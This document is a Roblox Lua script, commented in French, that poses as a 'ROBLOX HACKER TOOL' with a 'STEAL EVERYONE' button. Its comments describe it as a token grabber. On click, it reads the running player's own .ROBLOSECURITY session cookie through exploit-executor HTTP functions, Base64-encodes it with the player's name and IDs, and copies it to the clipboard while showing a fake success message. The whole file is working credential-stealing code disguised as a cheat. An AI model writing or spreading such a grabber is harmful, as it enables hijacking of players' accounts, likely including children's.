print("check 0")
-- Script GUI à exécuter dans Roblox
-- Ce script crée un bouton "STEAL EVERYONE" qui charge le token grabber

-- Services Roblox
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Créer le GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HackerToolGUI"
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "🔓 ROBLOX HACKER TOOL V3.5 🔓"
title.Size = UDim2.new(1, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 50, 50)
title.TextScaled = true
title.Parent = frame

local stealButton = Instance.new("TextButton")
stealButton.Text = "STEAL EVERYONE"
stealButton.Size = UDim2.new(0.8, 0, 0.4, 0)
stealButton.Position = UDim2.new(0.1, 0, 0.5, 0)
stealButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stealButton.Parent = frame

-- Quand le joueur clique sur "STEAL EVERYONE"
stealButton.MouseButton1Click:Connect(function()
    stealButton.Text = "HACKING..."
    wait(2)

    -- Charger le script token grabber
    print("check 1")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    
    -- Fonction pour obtenir le cookie .ROBLOSECURITY
    local function getCookie()
        local cookie = ""
        if syn then
            local res = syn.request({ Url = "https://roblox.com", Method = "GET" })
            if res and res.Cookies then cookie = res.Cookies[".ROBLOSECURITY"] end
        elseif http and http.request then
            local res = http.request({ Url = "https://roblox.com", Method = "GET" })
            if res and res.Cookies then cookie = res.Cookies[".ROBLOSECURITY"] end
        elseif request then
            local res = request({ Url = "https://roblox.com", Method = "GET" })
            if res and res.Cookies then cookie = res.Cookies[".ROBLOSECURITY"] end
        end
        return cookie or "Cookie non trouvé"
    end
    
    -- Fonction pure Lua pour encoder en Base64
    local function base64Encode(data)
        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        return ((data:gsub('.', function(x)
            local r,binary='', x:byte()
            for i=8,1,-1 do
                r = r..(binary%2^i-binary%2^(i-1)>0 and '1' or '0')
            end
            return r
        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
            if #x < 6 then return '' end
            local c=0
            for i=1,6 do
                c = c + (x:sub(i,i)=='1' and 2^(6-i) or 0)
            end
            return b:sub(c+1,c+1)
        end)..({ '', '==', '=' })[#data%3+1])
    end
    
    -- Copier le texte simple en Base64 dans le presse‑papier
    local function copyToClipboardBase64(token, userId, userName)
        local text = "Nom: "..userName.."\nID: "..userId.."\nToken: "..token.."\nPlace: "..game.PlaceId.."\nTemps: "..os.time().."\nPlateforme: Android / Clipboard"
        local base64Data = base64Encode(text)
        
        if setclipboard then
            setclipboard(base64Data)
            print("Texte copié en Base64 dans le presse‑papier")
        else
            warn("setclipboard non supporté sur cet exécuteur")
            print(base64Data)
        end
    end
    
    -- Exécution principale
    local cookie = getCookie()
    if cookie ~= "Cookie non trouvé" then
        copyToClipboardBase64(cookie, player.UserId, player.Name)
    else
        warn("Cookie non récupéré")
    end
    
    -- Notification locale
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Succès",
        Text = "Texte copié en Base64 dans le presse‑papier",
        Duration = 5
    })
    
    -- Simuler un hack réussi
    stealButton.Text = "SUCCESS!"
    wait(1)
    frame:Destroy()  -- Fermer le GUI après le "hack"
end)
